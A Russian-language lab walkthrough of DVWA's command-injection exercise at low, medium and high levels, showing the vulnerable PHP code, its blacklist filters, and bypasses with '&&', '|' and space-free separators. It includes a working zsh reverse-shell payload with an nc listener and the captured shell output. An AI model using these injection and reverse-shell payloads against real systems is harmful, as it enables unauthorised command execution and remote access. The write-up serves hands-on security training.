Когда мы вписываем ip адрес, сайт выполняет команду 

```sh
$ ping <Наш IP> 
```

Мы легко можем продолжить эту команду используя **&&**:
```sh
$ ping <Наш IP> && id
```

В итоге наш пейлоад выглядит вот так:
```sh
127.0.0.1 && id
```

На выходе получим
```sh
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.074 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.079 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.074 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.052 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3061ms
rtt min/avg/max/mdev = 0.052/0.069/0.079/0.010 ms
uid=129(_dvwa) gid=134(_dvwa) groups=134(_dvwa)
```

Но это как-то слабенько, давайте получим полноценный шелл!

с помощью https://www.revshells.com сгенерирую пейлоад, у меня оболочка zsh поэтому генерирую для нее

Итоговый пейлоад
```zsh
127.0.0.1 && zsh -c 'zmodload zsh/net/tcp && ztcp 127.0.0.1 9000 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

Откроем у себя порт:
```sh
└─$ nc -lvnp 9000
listening on [any] 9000 ...
```

Отправим команду и получим наш шелл:
```sh
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50272
ls
help
index.php
source
id
uid=129(_dvwa) gid=134(_dvwa) groups=134(_dvwa)
```

#### Уязвимый код
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>
```
Без фильтрации, без ничего. Наш запрос вставляется напрямую и можем выполнить команду.

После этого шелла у меня отрубился **DVWA** полностью, поцесс не хотел завершаться даже после выхода из шелла. Что бы это починить введите команду `ps aux | grep zsh` 
Найдите примерно такой процесс

```sh
_dvwa      19554  0.0  0.0   4504  2912 ?        S    00:16   0:00 zsh
```
Вторая колонда это PID - номер процесса
И введите команду 

```sh
└─$ sudo kill -9 PID
```
PID - номер процесса
После этого все заработает опять. В дальшейшем я не буду получать шелл, что бы с этим не парится, будем считать успехом если смогли вызвать команду **`id`**
### MEDIUM

На этом уровне уже появляется фильтрация. Прошлый запрос ничего не вернет. Сивмовы && и ; фильтруются. Мы можем использовать другой оператор для разделения команд - `|` 
```sh
127.0.0.1 | id
```

```sh
uid=129(_dvwa) gid=134(_dvwa) groups=134(_dvwa)
```

Отлично! В коде написано вот так, это и есть фильтрация
```sh
$substitutions = array(
		'&&' => '',
		';'  => '',
	);
```

### HIGH

На этом уровне фильтрация вроде как становится сложнее, но все равно сохраняется ошибка в фильтре.
Если ввести команду без пробелов то все сработает

```sh
127.0.0.1|id
```

Вывод:
```sh
uid=129(_dvwa) gid=134(_dvwa) groups=134(_dvwa)
```

Вот фильтрация из кода:
```sh
// Set blacklist
	$substitutions = array(
		'&'  => '',
		';'  => '',
		'| ' => '',
		'-'  => '',
		'$'  => '',
		'('  => '',
		')'  => '',
		'`'  => '',
		'||' => '',
```

Мы видим что | фильтруется с пробелом, мы ввели без пробела, поэтому скрипт выполняется.

В общем, лучше не использовать фильтрацию, тут уже архитектурная ошибка. Мы даем пользователю прямой доступ к оболочке, а это критично.
